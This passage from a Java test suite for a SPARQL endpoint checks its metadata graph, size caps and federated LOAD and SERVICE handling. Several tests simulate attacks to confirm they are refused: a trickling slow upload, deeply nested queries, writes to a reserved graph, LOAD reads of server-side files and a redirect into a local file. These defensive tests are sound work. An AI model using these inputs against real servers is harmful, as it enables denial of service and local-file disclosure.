            var none = get(e.url(), "ASK { ?a <urn:ex:vehicle> <urn:ex:EV-3K8> }", null);
            assertTrue(none.body().replace(" ", "").contains("\"boolean\":false"));
        }
    }

    // ---- the metadata graph -----------------------------------------------------------------

    static final String META = "cqels://endpoint/metadata";
    static final String CQE = "PREFIX cqe: <cqels://ontology/endpoint#> ";

    static Endpoint withMetadata() throws Exception {
        return Endpoint.start(EndpointOptions.defaults().withMetadataEnabled(true).withUpdateEnabled(true), 0);
    }

    static String csv(String url, String query) throws Exception {
        var r = get(url, query, "text/csv");
        assertEquals(200, r.statusCode(), r.body());
        return r.body();
    }

    static boolean ask(String url, String query) throws Exception {
        var r = get(url, query, null);
        assertEquals(200, r.statusCode(), r.body());
        return r.body().replace(" ", "").contains("\"boolean\":true");
    }

    @Test
    void metadataGraphListsStreamsWithTheirAttributes() throws Exception {
        try (Endpoint e = withMetadata()) {
            e.engine().createStream("Telemetry", java.util.Map.of("unit", "km/h", "source", "can-bus"));
            e.engine().createStream("https://example.org/fleet/stream/soc");
            e.engine().createStream("fleet speed/raw");
            String streams = csv(e.url(), CQE + "SELECT ?s ?name FROM <" + META + "> WHERE { "
                    + "<cqels://endpoint/engine> cqe:stream ?s . ?s a cqe:Stream ; cqe:name ?name } ORDER BY ?name");
            assertTrue(streams.contains("cqels://streams/Telemetry,Telemetry"), streams);
            // an absolute IRI is the stream's node as it is; any other name is encoded under cqels://streams/
            assertTrue(streams.contains("https://example.org/fleet/stream/soc,https://example.org/fleet/stream/soc"), streams);
            assertTrue(streams.contains("cqels://streams/fleet%20speed%2Fraw,fleet speed/raw"), streams);
            String attrs = csv(e.url(), CQE + "SELECT ?k ?v FROM <" + META + "> WHERE { "
                    + "<cqels://streams/Telemetry> cqe:attribute [ cqe:key ?k ; cqe:value ?v ] } ORDER BY ?k");
            assertTrue(attrs.contains("source,can-bus") && attrs.contains("unit,km/h"), attrs);
        }
    }

    @Test
    void streamsWhoseNodesWouldCollideStayApart() throws Exception {
        // found in co-review of #121: both mapped to <cqels://streams/Telemetry>, and each
        // stream then appeared to carry the other's unit
        try (Endpoint e = withMetadata()) {
            e.engine().createStream("Telemetry", java.util.Map.of("unit", "speed"));
            e.engine().createStream("cqels://streams/Telemetry", java.util.Map.of("unit", "temperature"));
            String rows = csv(e.url(), CQE + "SELECT ?name ?unit FROM <" + META + "> WHERE { "
                    + "?s cqe:name ?name ; cqe:attribute [ cqe:key \"unit\" ; cqe:value ?unit ] } ORDER BY ?name ?unit");
            assertEquals("name,unit\r\nTelemetry,speed\r\ncqels://streams/Telemetry,temperature\r\n", rows);
            assertTrue(ask(e.url(), CQE + "ASK FROM <" + META + "> { <cqels://streams/Telemetry> cqe:name \"cqels://streams/Telemetry\" }"));
        }
        // round 2: a stream named like the engine's node must not merge with the engine
        try (Endpoint e = withMetadata()) {
            e.engine().createStream("cqels://endpoint/engine", java.util.Map.of("unit", "speed"));
            assertFalse(ask(e.url(), CQE + "ASK FROM <" + META + "> { ?s a cqe:Stream ; cqe:running ?r }"));
            assertFalse(ask(e.url(), CQE + "ASK FROM <" + META + "> { <cqels://endpoint/engine> cqe:attribute ?a }"));
            assertTrue(ask(e.url(), CQE + "ASK FROM <" + META + "> { <cqels://endpoint/engine> cqe:stream ?s . "
                    + "?s cqe:name \"cqels://endpoint/engine\" ; cqe:attribute [ cqe:value \"speed\" ] }"));
        }
    }

    @Test
    void metadataGraphCarriesTheEngineStatus() throws Exception {
        try (Endpoint e = withMetadata()) {
            e.engine().createStream("S");
            e.engine().registerCqelsQuery("""
                    REGISTER QUERY Q AS
                    SELECT ?v FROM STREAM S [NOW] WHERE { STREAM S { ?v <urn:ex:p> ?o } }
                    """, row -> { });
            String status = csv(e.url(), CQE + "SELECT ?running ?queries ?persistence FROM NAMED <" + META + "> WHERE { "
                    + "GRAPH <" + META + "> { ?e a cqe:Engine ; cqe:running ?running ; cqe:registeredQueries ?queries ; "
                    + "cqe:persistence ?persistence ; cqe:snapshotAt ?at } }");
            assertTrue(status.contains("true,1,NO_PERSISTENCE"), status);
            // the protocol parameter selects the graph as FROM does
            var byParam = HTTP.send(HttpRequest.newBuilder(URI.create(e.url() + "?query="
                    + enc(CQE + "ASK { ?e cqe:running true }") + "&default-graph-uri=" + enc(META))).build(),
                    HttpResponse.BodyHandlers.ofString());
            assertEquals(200, byParam.statusCode(), byParam.body());
            assertTrue(byParam.body().replace(" ", "").contains("\"boolean\":true"), byParam.body());
        }
    }

    @Test
    void metadataGraphIsASnapshotPerQuery() throws Exception {
        try (Endpoint e = withMetadata()) {
            String q = CQE + "ASK FROM <" + META + "> { ?s cqe:name \"Late\" }";
            assertFalse(ask(e.url(), q));
            e.engine().createStream("Late");
            assertTrue(ask(e.url(), q), "a stream created after the first query must show in the next");
            e.engine().removeStream("Late");
            assertFalse(ask(e.url(), q), "a removed stream must be gone from the next query");
        }
    }

    @Test
    void metadataGraphStaysOutOfTheStore() throws Exception {
        try (Endpoint e = withMetadata()) {
            e.engine().createStream("Telemetry");
            assertTrue(ask(e.url(), CQE + "ASK FROM <" + META + "> { ?s a cqe:Stream }"));
            // not in the default graph every query without FROM sees — the engine's own included
            assertFalse(ask(e.url(), CQE + "ASK { ?s a cqe:Stream }"));
            try (RepositoryConnection c = e.engine().getRepository().getConnection()) {
                assertFalse(c.hasStatement(null, null, null, false, VF.createIRI(META)));
            }
            // so it cannot share a dataset with the store's graphs …
            var mixed = get(e.url(), "SELECT * FROM <" + META + "> FROM <urn:ex:g1> WHERE { ?s ?p ?o }", null);
            assertEquals(400, mixed.statusCode(), mixed.body());
            assertTrue(mixed.body().contains("on its own"), mixed.body());
            // … and GRAPH <meta> without the dataset naming it says so instead of answering empty
            var unnamed = get(e.url(), "SELECT * WHERE { GRAPH <" + META + "> { ?s ?p ?o } }", null);
            assertEquals(400, unnamed.statusCode(), unnamed.body());
            assertTrue(unnamed.body().contains("FROM NAMED"), unnamed.body());
            // RDF4J's algebra keeps no trace of a GRAPH clause that reads no triples, so the
            // check reads the syntax tree: found in co-review of #121, where these answered 200
            for (String q : List.of(
                    "ASK { GRAPH <" + META + "> { BIND(1 AS ?x) } }",
                    "ASK { GRAPH <" + META + "> { } }",
                    "SELECT * WHERE { ?v <urn:ex:depot> ?d GRAPH <" + META + "> { VALUES ?x { 1 } } }",
                    "PREFIX m: <cqels://endpoint/> ASK { GRAPH m:metadata { BIND(1 AS ?x) } }",
                    "BASE <cqels://endpoint/> ASK { GRAPH <metadata> { BIND(1 AS ?x) } }",
                    "ASK { FILTER EXISTS { GRAPH <" + META + "> { BIND(1 AS ?x) } } }")) {
                var r = get(e.url(), q, null);
                assertEquals(400, r.statusCode(), q + " -> " + r.body());
            }
        }
    }

    @Test
    void metadataGraphIsRefusedWhenNotEnabled() throws Exception {
        assertFalse(EndpointOptions.defaults().metadataEnabled());
        var r = get(shared.url(), "ASK FROM <" + META + "> { ?s ?p ?o }", null);
        assertEquals(403, r.statusCode(), r.body());
        assertTrue(r.body().contains("CQELS_SPARQL_METADATA_ENABLED"), r.body());
    }

    @Test
    void updatesCannotWriteTheMetadataGraph() throws Exception {
        try (Endpoint e = withMetadata()) {
            String form = "application/x-www-form-urlencoded";
            for (String update : List.of(
                    "INSERT DATA { GRAPH <" + META + "> { <urn:ex:a> <urn:ex:b> <urn:ex:c> } }",
                    // the prefixed form hides the IRI from the parse of INSERT DATA; the effect still shows it
                    "PREFIX x: <cqels://endpoint/> INSERT DATA { GRAPH x:metadata { <urn:ex:a> <urn:ex:b> <urn:ex:c> } }",
                    // WITH scopes the WHERE to that graph too, hence the empty pattern: one solution
                    "WITH <" + META + "> INSERT { <urn:ex:a> <urn:ex:b> <urn:ex:c> } WHERE { }",
                    "ADD <urn:ex:g1> TO <" + META + ">")) {
                var r = post(e.url(), form, "update=" + enc(update), null);
                assertEquals(403, r.statusCode(), update + " -> " + r.body());
                assertTrue(r.body().contains("reserved"), r.body());
            }
            try (RepositoryConnection c = e.engine().getRepository().getConnection()) {
                assertFalse(c.hasStatement(null, null, null, false, VF.createIRI(META)), "a refused update was not undone");
            }
            // any other graph is writable as before
            var ok = post(e.url(), form, "update=" + enc("INSERT DATA { GRAPH <urn:ex:g3> { <urn:ex:a> <urn:ex:b> <urn:ex:c> } }"), null);
            assertEquals(204, ok.statusCode(), ok.body());

            // Triples put there behind the endpoint's back block every update that leaves them,
            // and an update that removes them is accepted.
            try (RepositoryConnection c = e.engine().getRepository().getConnection()) {
                c.add(iri("x"), iri("y"), iri("z"), VF.createIRI(META));
            }
            var blocked = post(e.url(), form, "update=" + enc("INSERT DATA { <urn:ex:a> <urn:ex:b> <urn:ex:d> }"), null);
            assertEquals(403, blocked.statusCode(), blocked.body());
            assertFalse(ask(e.url(), "ASK { <urn:ex:a> <urn:ex:b> <urn:ex:d> }"), "the blocked update must be undone");
            var cleared = post(e.url(), form, "update=" + enc("CLEAR GRAPH <" + META + ">"), null);
            assertEquals(204, cleared.statusCode(), cleared.body());
        }
    }

    // ---- the audit after #121: resources and outbound requests ------------------------------

    /**
     * A POST whose body trickles in used to hold a request thread the slots never counted, so
     * with enough of them neither the 503 nor /health answered. It now holds a slot: the next
     * request is turned away at once, /health answers, and the upload deadline gives the slot back.
     */
    @Test
    void aSlowUploadHoldsASlotNotAThreadAndIsCutOff() throws Exception {
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withMaxConcurrentQueries(1).withMaxUploadSeconds(2), 0);
             java.net.Socket slow = new java.net.Socket("127.0.0.1", URI.create(ep.url()).getPort())) {
            var out = slow.getOutputStream();
            out.write(("POST /sparql HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/sparql-query\r\n"
                    + "Content-Length: 1000\r\n\r\nASK").getBytes(StandardCharsets.US_ASCII));
            out.flush();
            String ask = ep.url() + "?query=" + enc("ASK {}");
            // Waited for on the servlet, not probed with queries: a probe that held the only slot
            // when the upload arrived had the upload refused at once with 503, and the test then
            // failed in about half its runs ("never held the slot"; found while running #135).
            awaitSlotsInUse(servletOf(ep.server), 1);
            HttpResponse<String> busy = getWithin(ask, java.time.Duration.ofSeconds(2));
            assertEquals(503, busy.statusCode(), "the trickling upload holds the slot");
            String base = ep.url().substring(0, ep.url().length() - "/sparql".length());
            assertEquals(200, getWithin(base + "/health", java.time.Duration.ofSeconds(2)).statusCode());
            // keep trickling, a byte every 300 ms, until the server answers
            slow.setSoTimeout(15_000);
            var in = new java.io.BufferedReader(new java.io.InputStreamReader(slow.getInputStream(), StandardCharsets.US_ASCII));
            Thread trickle = new Thread(() -> {
                try {
                    for (int i = 0; i < 40; i++) {
                        Thread.sleep(300);
                        out.write(' ');
                        out.flush();
                    }
                } catch (Exception ignored) {
                    // the server closed the connection: done
                }
            });
            trickle.setDaemon(true);
            long t0 = System.nanoTime();
            trickle.start();
            String status = in.readLine();
            assertTrue(status != null && status.contains(" 408 "), "status line: " + status);
            assertTrue((System.nanoTime() - t0) / 1e9 < 8, "the deadline took too long");
            assertEquals(200, getWithin(ask, java.time.Duration.ofSeconds(5)).statusCode(), "the slot was not given back");
        }
    }

    /** 2,000 nested parentheses (4 KB) overflowed RDF4J's parser into Jetty's HTML error page. */
    @Test
    void aDeeplyNestedQueryIs400NotAStackOverflowPage() throws Exception {
        String deep = "SELECT (" + "(".repeat(2000) + "1" + ")".repeat(2000) + " AS ?x) WHERE {}";
        var r = post(shared.url(), "application/sparql-query", deep, null);
        assertEquals(400, r.statusCode(), r.body());
        assertTrue(type(r).startsWith("text/plain"), type(r));
        assertTrue(r.body().contains("nests too deeply"), r.body());
        assertFalse(r.body().contains("Jetty"), r.body());
        assertEquals(200, get(shared.url(), "ASK {}", null).statusCode());   // and the slot came back
    }

    /** An OutOfMemoryError gets a plain answer and gives its slot back; the supplier stands in for a heap blow-up. */
    @Test
    void runningOutOfHeapIsAnsweredAndTheSlotReturned() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        java.util.concurrent.atomic.AtomicInteger calls = new java.util.concurrent.atomic.AtomicInteger();
        java.util.function.Supplier<org.eclipse.rdf4j.repository.Repository> blowsUpOnce = () -> {
            if (calls.getAndIncrement() == 0) {
                throw new OutOfMemoryError("stand-in for a GROUP BY that filled the heap");
            }
            return engine.getRepository();
        };
        Server server = SparqlEndpointLauncher.startServer(blowsUpOnce, null, "127.0.0.1", 0,
                EndpointOptions.defaults().withMaxConcurrentQueries(1), 64, false);
        try {
            String url = "http://127.0.0.1:" + ((ServerConnector) server.getConnectors()[0]).getLocalPort() + "/sparql";
            var r = get(url, "ASK {}", null);
            assertEquals(500, r.statusCode(), r.body());
            assertTrue(type(r).startsWith("text/plain"), type(r));
            assertTrue(r.body().contains("ran out of server memory"), r.body());
            assertEquals(200, get(url, "ASK {}", null).statusCode(), "the slot was not given back");
        } finally {
            server.stop();
            engine.close();
        }
    }

    /**
     * {@code maxRows} capped rows, not memory: one computed literal was an 8 MB row under
     * {@code maxRows=1}. The buffer now stops at {@code maxBufferedBytes} too — and the cap covers
     * CONSTRUCT and DESCRIBE, which streamed whatever it said.
     */
    @Test
    void theRowCapAlsoBoundsBytesAndGraphResults() throws Exception {
        try (Endpoint capped = Endpoint.start(EndpointOptions.defaults().withMaxRows(1000).withMaxBufferedBytes(50_000), 10)) {
            // each row carries a 10,000-character string (about 20 KB estimated): two fit, the third does not
            var big = post(capped.url(), "application/sparql-query", "SELECT ?s (CONCAT(STR(?s), \"" + "x".repeat(10_000)
                    + "\") AS ?big) WHERE { ?s <urn:ex:v> ?x }", "text/csv");
            assertEquals(200, big.statusCode(), big.body());
            assertEquals("true", big.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).orElse(""));
            assertEquals(3, big.body().strip().split("\n").length);   // header + 2 rows
            // a long datatype IRI counts too: it passed as 66 bytes
            var typed = post(capped.url(), "application/sparql-query", "SELECT (STRDT(\"x\", IRI(CONCAT(\"urn:\", STR(?x), \""
                    + "d".repeat(10_000) + "\"))) AS ?t) WHERE { ?s <urn:ex:v> ?x }", "text/csv");
            assertEquals(200, typed.statusCode(), typed.body());
            assertEquals("true", typed.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).orElse(""));
            var small = get(capped.url(), "SELECT ?s WHERE { ?s <urn:ex:v> ?x }", "text/csv");
            assertTrue(small.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).isEmpty(), "10 small rows fit");
        }
        // rows with nothing bound are not free: 65,536 of them passed a 1 KB cap as zero bytes
        try (Endpoint capped = Endpoint.start(EndpointOptions.defaults().withMaxRows(100_000).withMaxBufferedBytes(1024), 10)) {
            var empty = get(capped.url(), "SELECT ?unbound WHERE { ?a ?b ?c . ?d ?e ?f }", "text/csv");
            assertEquals(200, empty.statusCode(), empty.body());
            assertEquals("true", empty.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).orElse(""));
        }
        try (Endpoint capped = Endpoint.start(EndpointOptions.defaults().withMaxRows(2), 10)) {
            var graph = get(capped.url(), "CONSTRUCT { ?s <urn:ex:v> ?x } WHERE { ?s <urn:ex:v> ?x }", "application/n-triples");
            assertEquals(200, graph.statusCode(), graph.body());
            assertEquals("true", graph.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).orElse(""));
            assertEquals(2, graph.body().strip().split("\n").length, graph.body());
            var turtle = get(capped.url(), "CONSTRUCT { ?v <urn:ex:depot> <urn:ex:North> } WHERE { ?v <urn:ex:depot> <urn:ex:North> }", null);
            assertTrue(turtle.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).isEmpty());
            assertTrue(turtle.body().contains("EV-7Q2"), turtle.body());
        }
    }

    /**
     * RDF4J's JSON-LD writer holds the whole graph before writing, so with no row cap it is held
     * to maxBufferedBytes and refused beyond it; a streaming format is not limited.
     */
    @Test
    void jsonLdIsHeldToTheBufferBudget() throws Exception {
        try (Endpoint small = Endpoint.start(EndpointOptions.defaults().withMaxBufferedBytes(2_000), 50)) {
            String q = "CONSTRUCT { ?s <urn:ex:v> ?x } WHERE { ?s <urn:ex:v> ?x }";
            for (String type : List.of("application/ld+json", "application/x-ld+ndjson")) {   // both writers hold statements
                var json = get(small.url(), q, type);
                assertEquals(503, json.statusCode(), type + ": " + json.body());
                assertTrue(json.body().contains("N-Triples"), json.body());
            }
            // Turtle streams with pretty-printing off. A buffering writer regroups a subject
            // that keeps coming back between others; a streaming one writes it each time.
            var turtle = get(small.url(), "CONSTRUCT { ?s <urn:ex:v> ?x . <urn:ex:same> <urn:ex:saw> ?s } "
                    + "WHERE { ?s <urn:ex:v> ?x }", "text/turtle");
            assertEquals(200, turtle.statusCode(), turtle.body());
            assertTrue(turtle.body().split("urn:ex:same", -1).length - 1 > 10, "Turtle was buffered and regrouped: " + turtle.body());
            var nt = get(small.url(), q, "application/n-triples");
            assertEquals(200, nt.statusCode());
            assertEquals(50, nt.body().strip().split("\n").length);
            assertTrue(nt.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).isEmpty());
        }
    }

    @Test
    void constructIsAvailableAsRdfXmlAndJsonLd() throws Exception {
        String q = "CONSTRUCT { ?v <urn:ex:depot> ?d } WHERE { ?v <urn:ex:depot> ?d }";
        for (String type : List.of("application/rdf+xml", "application/ld+json")) {
            var r = get(shared.url(), q, type);
            assertEquals(200, r.statusCode(), type + ": " + r.body());
            assertTrue(type(r).startsWith(type), type(r));
            assertTrue(r.body().contains("EV-7Q2"), r.body());
        }
    }

    /** A tiny HTTP server answering each path with a handler. */
    static com.sun.net.httpserver.HttpServer serve(java.util.Map<String, com.sun.net.httpserver.HttpHandler> paths)
            throws IOException {
        var server = com.sun.net.httpserver.HttpServer.create(new java.net.InetSocketAddress("127.0.0.1", 0), 0);
        paths.forEach(server::createContext);
        server.setExecutor(java.util.concurrent.Executors.newCachedThreadPool());
        server.start();
        return server;
    }

    static com.sun.net.httpserver.HttpHandler respond(int status, String type, String body, long delayMillis,
                                                      String... headers) {
        return ex -> {
            try {
                Thread.sleep(delayMillis);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
            ex.getResponseHeaders().add("Content-Type", type);
            for (int i = 0; i + 1 < headers.length; i += 2) {
                ex.getResponseHeaders().add(headers[i], headers[i + 1]);
            }
            ex.sendResponseHeaders(status, bytes.length == 0 ? -1 : bytes.length);
            ex.getResponseBody().write(bytes);
            ex.close();
        };
    }

    static String base(com.sun.net.httpserver.HttpServer s) {
        return "http://127.0.0.1:" + s.getAddress().getPort();
    }

    /** With federation on, {@code LOAD <file:…>} read an RDF file off the server's disk into the store. */
    @Test
    void federationNamesOnlyHttpTargets(@org.junit.jupiter.api.io.TempDir java.nio.file.Path dir) throws Exception {
        java.nio.file.Path secret = dir.resolve("secret.ttl");
        java.nio.file.Files.writeString(secret, "<urn:ex:secret> <urn:ex:p> \"server-side file\" .\n");
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withUpdateEnabled(true), 0)) {
            var load = post(fed.url(), "application/sparql-update", "LOAD <" + secret.toUri() + ">", null);
            assertEquals(403, load.statusCode(), load.body());
            assertTrue(load.body().contains("http and https"), load.body());
            assertFalse(get(fed.url(), "ASK { <urn:ex:secret> ?p ?o }", null).body().replace(" ", "").contains("true"));
            var service = get(fed.url(), "SELECT * WHERE { SERVICE <" + secret.toUri() + "> { ?s ?p ?o } }", null);
            assertEquals(403, service.statusCode(), service.body());
            var upper = post(fed.url(), "application/sparql-update", "LOAD <FILE:" + secret.toUri().getPath() + ">", null);
            assertEquals(403, upper.statusCode(), upper.body());
        }
    }

    /** RDF4J's SERVICE client had no socket timeout, so a stalled remote held the slot past the execution limit. */
    @Test
    void aStalledServiceIs504WithinTheLimit() throws Exception {
        var remote = serve(java.util.Map.of("/sparql", respond(200, "application/sparql-results+json",
                "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}", 5_000)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withMaxExecutionSeconds(1), 0)) {
            long t0 = System.nanoTime();
            var r = get(fed.url(), "SELECT * WHERE { SERVICE <" + base(remote) + "/sparql> { ?s ?p ?o } }", null);
            double took = (System.nanoTime() - t0) / 1e9;
            assertEquals(504, r.statusCode(), r.body());
            assertTrue(took < 4, "took " + took + " s");
        } finally {
            remote.stop(0);
        }
    }

    /**
     * LOAD is performed by the servlet: RDF4J's loader followed a redirect into a local file and
     * waited without a deadline. Redirects to http(s) still work; anything else is refused.
     */
    @Test
    void loadIsBoundedAndFollowsOnlyHttpRedirects(@org.junit.jupiter.api.io.TempDir java.nio.file.Path dir) throws Exception {
        java.nio.file.Path secret = dir.resolve("secret.ttl");
        java.nio.file.Files.writeString(secret, "<urn:ex:secret> <urn:ex:p> \"server-side file\" .\n");
        var remote = serve(java.util.Map.of(
                "/data.ttl", respond(200, "text/turtle", "<urn:ex:loaded> <urn:ex:p> \"fetched\" .\n", 0),
                "/elsewhere", respond(200, "application/n-triples", "<urn:ex:moved> <urn:ex:p> \"followed\" .\n", 0),
                "/moved", respond(302, "text/plain", "", 0, "Location", "/elsewhere"),
                "/redirect.ttl", respond(302, "text/plain", "", 0, "Location", secret.toUri().toString()),
                "/stalled.ttl", respond(200, "text/turtle", "<urn:ex:late> <urn:ex:p> 1 .\n", 6_000),
                "/missing.ttl", respond(404, "text/plain", "no", 0),
                "/data.ttl.gz", ex -> {
                    var bytes = new java.io.ByteArrayOutputStream();
                    try (var gz = new java.util.zip.GZIPOutputStream(bytes)) {
                        gz.write("<urn:ex:gzfile> <urn:ex:p> \"unpacked\" .\n".getBytes(StandardCharsets.UTF_8));
                    }
                    ex.getResponseHeaders().add("Content-Type", "application/gzip");
                    ex.sendResponseHeaders(200, bytes.size());
                    ex.getResponseBody().write(bytes.toByteArray());
                    ex.close();
                },
                "/archive.zip", ex -> {
                    var bytes = new java.io.ByteArrayOutputStream();
                    try (var zip = new java.util.zip.ZipOutputStream(bytes)) {
                        zip.putNextEntry(new java.util.zip.ZipEntry("one.ttl"));
                        zip.write("<urn:ex:zip1> <urn:ex:p> 1 .\n".getBytes(StandardCharsets.UTF_8));
                        zip.putNextEntry(new java.util.zip.ZipEntry("dir/two.nt"));
                        zip.write("<urn:ex:zip2> <urn:ex:p> \"2\" .\n".getBytes(StandardCharsets.UTF_8));
                    }
                    ex.getResponseHeaders().add("Content-Type", "application/zip");
                    ex.sendResponseHeaders(200, bytes.size());
                    ex.getResponseBody().write(bytes.toByteArray());
                    ex.close();
                },
                "/zipped.ttl", ex -> {
                    var bytes = new java.io.ByteArrayOutputStream();
                    try (var gz = new java.util.zip.GZIPOutputStream(bytes)) {
                        gz.write("<urn:ex:zipped> <urn:ex:p> \"decoded\" .\n".getBytes(StandardCharsets.UTF_8));
                    }
                    ex.getResponseHeaders().add("Content-Type", "text/turtle");
                    ex.getResponseHeaders().add("Content-Encoding", "gzip");
                    ex.sendResponseHeaders(200, bytes.size());
                    ex.getResponseBody().write(bytes.toByteArray());
                    ex.close();
                }));
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withUpdateEnabled(true)
                .withMaxExecutionSeconds(2), 0)) {
            String r = base(remote);
            assertEquals(204, post(ep.url(), "application/sparql-update", "LOAD <" + r + "/data.ttl>", null).statusCode());
            assertTrue(ask(ep.url(), "ASK { <urn:ex:loaded> ?p ?o }"));
            assertEquals(204, post(ep.url(), "application/sparql-update", "LOAD <" + r + "/moved> INTO GRAPH <urn:ex:g9>", null).statusCode());
            assertTrue(ask(ep.url(), "ASK { GRAPH <urn:ex:g9> { <urn:ex:moved> ?p ?o } }"), "an http redirect is followed, into the named graph");

            var toFile = post(ep.url(), "application/sparql-update", "LOAD <" + r + "/redirect.ttl>", null);
            assertEquals(502, toFile.statusCode(), toFile.body());
            assertFalse(ask(ep.url(), "ASK { <urn:ex:secret> ?p ?o }"), "LOAD followed a redirect into a local file");

            long t0 = System.nanoTime();
            var stalled = post(ep.url(), "application/sparql-update", "LOAD <" + r + "/stalled.ttl>", null);
            double took = (System.nanoTime() - t0) / 1e9;
            assertEquals(504, stalled.statusCode(), stalled.body());
            assertTrue(took < 5, "took " + took + " s");

            assertEquals(502, post(ep.url(), "application/sparql-update", "LOAD <" + r + "/missing.ttl>", null).statusCode());
            var zipped = post(ep.url(), "application/sparql-update", "LOAD <" + r + "/zipped.ttl>", null);
            assertEquals(204, zipped.statusCode(), zipped.body());
            assertTrue(ask(ep.url(), "ASK { <urn:ex:zipped> ?p \"decoded\" }"), "a gzip-encoded source was not decoded");
            assertEquals(204, post(ep.url(), "application/sparql-update", "LOAD <" + r + "/data.ttl.gz>", null).statusCode());
            assertTrue(ask(ep.url(), "ASK { <urn:ex:gzfile> ?p \"unpacked\" }"), "a .ttl.gz file was not unpacked");
            assertEquals(204, post(ep.url(), "application/sparql-update", "LOAD <" + r + "/archive.zip>", null).statusCode());
            assertTrue(ask(ep.url(), "ASK { <urn:ex:zip1> ?p ?o . <urn:ex:zip2> ?q ?r }"), "a zip archive's files were not all loaded");
            assertEquals(204, post(ep.url(), "application/sparql-update", "LOAD SILENT <" + r + "/missing.ttl>", null).statusCode());
            var mixed = post(ep.url(), "application/sparql-update",
                    "LOAD <" + r + "/data.ttl> ; INSERT DATA { <urn:ex:a> <urn:ex:b> <urn:ex:c> }", null);
            assertEquals(400, mixed.statusCode(), mixed.body());
            var reserved = post(ep.url(), "application/sparql-update", "LOAD <" + r + "/data.ttl> INTO GRAPH <" + META + ">", null);
            assertEquals(403, reserved.statusCode(), reserved.body());

            // the LOAD client goes with the servlet on stop and comes back after a restart
            var servlet = servletOf(ep.server());
            assertTrue(servlet.loadClientHeld());
            ep.server().stop();
            assertFalse(servlet.loadClientHeld(), "Jetty stopped and the LOAD client stayed");
            ep.server().start();
            String again = "http://127.0.0.1:" + ((ServerConnector) ep.server().getConnectors()[0]).getLocalPort() + "/sparql";
            assertEquals(204, post(again, "application/sparql-update", "LOAD <" + r + "/data.ttl> INTO GRAPH <urn:ex:again>", null).statusCode());
        } finally {
            remote.stop(0);
        }
    }

    static byte[] gzip(String text) throws IOException {
        var bytes = new java.io.ByteArrayOutputStream();
        try (var gz = new java.util.zip.GZIPOutputStream(bytes)) {
            gz.write(text.getBytes(StandardCharsets.UTF_8));
        }
        return bytes.toByteArray();
    }

    static com.sun.net.httpserver.HttpHandler bytes(byte[] body, String... headers) {
        return ex -> {
            for (int i = 0; i + 1 < headers.length; i += 2) {
                ex.getResponseHeaders().add(headers[i], headers[i + 1]);
            }
            ex.sendResponseHeaders(200, body.length);
            ex.getResponseBody().write(body);
            ex.close();
        };
    }

    /**
     * Packing is told by the bytes, not the name: a .ttl.gz whose Content-Encoding the client
     * already undid was unpacked twice, and a gzipped file inside a zip reached the parser packed.
     */
    @Test
    void loadUnpacksByContentNotByName() throws Exception {
        var zipped = new java.io.ByteArrayOutputStream();
        try (var zip = new java.util.zip.ZipOutputStream(zipped)) {
            zip.putNextEntry(new java.util.zip.ZipEntry("data.ttl.gz"));
            zip.write(gzip("<urn:ex:nested> <urn:ex:p> \"inner\" .\n"));
        }
        var unnamed = new java.io.ByteArrayOutputStream();
        try (var zip = new java.util.zip.ZipOutputStream(unnamed)) {
            zip.putNextEntry(new java.util.zip.ZipEntry("part"));
            zip.write("<urn:ex:unnamed> <urn:ex:p> 1 .\n".getBytes(StandardCharsets.UTF_8));
        }
        var hidden = new java.io.ByteArrayOutputStream();
        try (var zip = new java.util.zip.ZipOutputStream(hidden)) {
            zip.putNextEntry(new java.util.zip.ZipEntry("ignored/"));
            zip.write(new byte[2 << 20]);   // 2 MiB of zeros in a directory entry
            zip.putNextEntry(new java.util.zip.ZipEntry("data.ttl"));
            zip.write("<urn:ex:hidden> <urn:ex:p> 1 .\n".getBytes(StandardCharsets.UTF_8));
        }
        byte[] badEncoding = ("<?xml version=\"1.0\" encoding=\"X-BOGUS\"?><rdf:RDF "
                + "xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"/>").getBytes(StandardCharsets.US_ASCII);
        var budgeted = serve(java.util.Map.of(
                "/hidden.zip", bytes(hidden.toByteArray(), "Content-Type", "application/zip"),
                "/bogus.rdf", bytes(badEncoding, "Content-Type", "application/rdf+xml")));
        try (Endpoint small = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withUpdateEnabled(true)
                .withMaxBufferedBytes(4096), 0)) {
            var r = post(small.url(), "application/sparql-update", "LOAD <" + base(budgeted) + "/hidden.zip>", null);
            assertEquals(502, r.statusCode(), "a directory entry's data escaped the budget: " + r.body());
            var silent = post(small.url(), "application/sparql-update", "LOAD SILENT <" + base(budgeted) + "/bogus.rdf>", null);
            assertEquals(204, silent.statusCode(), "a parser I/O failure escaped LOAD SILENT: " + silent.body());
        } finally {
            budgeted.stop(0);
        }
        var remote = serve(java.util.Map.of(
                "/encoded.ttl.gz", bytes(gzip("<urn:ex:encoded> <urn:ex:p> \"once\" .\n"),
                        "Content-Type", "text/turtle", "Content-Encoding", "gzip"),
                "/archive.ttl.zip", bytes(zipped.toByteArray(), "Content-Type", "application/zip"),
                // the format comes from the source when the unpacked part cannot name it
                "/blob", bytes(gzip("<urn:ex:blob> <urn:ex:p> 1 .\n"), "Content-Type", "text/turtle"),
                "/second.ttl.zip", bytes(unnamed.toByteArray(), "Content-Type", "application/zip")));
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withUpdateEnabled(true), 0)) {
            var once = post(ep.url(), "application/sparql-update", "LOAD <" + base(remote) + "/encoded.ttl.gz>", null);
